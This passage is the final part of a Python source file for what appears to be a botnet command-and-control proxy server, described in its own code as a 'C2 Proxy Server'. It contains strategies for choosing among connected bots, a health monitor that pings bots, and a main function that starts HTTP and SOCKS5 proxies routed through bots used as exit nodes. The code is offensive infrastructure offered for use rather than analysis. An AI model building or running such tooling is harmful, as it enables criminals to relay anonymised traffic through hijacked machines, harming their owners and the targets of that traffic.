                      if info['status'] == 'active' and info['health_score'] > 50}
        
        if not active_bots:
            return None
            
        if strategy == "round_robin":
            bot_ids = list(active_bots.keys())
            selected_bot = bot_ids[self.current_bot_index % len(bot_ids)]
            self.current_bot_index += 1
            return selected_bot
            
        elif strategy == "least_connections":
            return min(active_bots.keys(), 
                      key=lambda x: active_bots[x]['connections'])
                      
        elif strategy == "health_based":
            return max(active_bots.keys(), 
                      key=lambda x: active_bots[x]['health_score'])
                      
        elif strategy == "random":
            return random.choice(list(active_bots.keys()))
            
        return list(active_bots.keys())[0]

class BotHealthMonitor:
    def __init__(self):
        self.health_check_interval = 30
        
    def check_bot_health(self, connected_bots, bot_exit_nodes):
        """Kiểm tra sức khỏe bot"""
        current_time = datetime.now()
        
        for bot_id, bot_info in connected_bots.items():
            try:
                # Check if bot is responsive
                last_seen = bot_info['last_seen']
                time_diff = (current_time - last_seen).total_seconds()
                
                if time_diff > 60:  # No response for 1 minute
                    bot_info['status'] = 'offline'
                    if bot_id in bot_exit_nodes:
                        bot_exit_nodes[bot_id]['status'] = 'offline'
                        
                # Send ping to bot
                bot_socket = bot_info['socket']
                bot_socket.send("PING\n".encode())
                
            except Exception as e:
                print(f"❌ Health check failed for bot {bot_id}: {e}")
                bot_info['status'] = 'offline'
                if bot_id in bot_exit_nodes:
                    bot_exit_nodes[bot_id]['status'] = 'offline'

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="C2 Proxy Server")
    parser.add_argument("--c2-host", default="0.0.0.0", help="C2 server host")
    parser.add_argument("--c2-port", type=int, default=3333, help="C2 server port")
    parser.add_argument("--proxy-port", type=int, default=8080, help="HTTP proxy server port")
    parser.add_argument("--socks-port", type=int, default=1080, help="SOCKS5 proxy server port")
    
    args = parser.parse_args()
    
    # Create and start server
    server = C2ProxyServer(args.c2_host, args.c2_port, args.proxy_port, args.socks_port)
    
    try:
        server.start()
        
        # Keep running
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n🛑 Shutdown requested")
        server.stop()

if __name__ == "__main__":
    main()
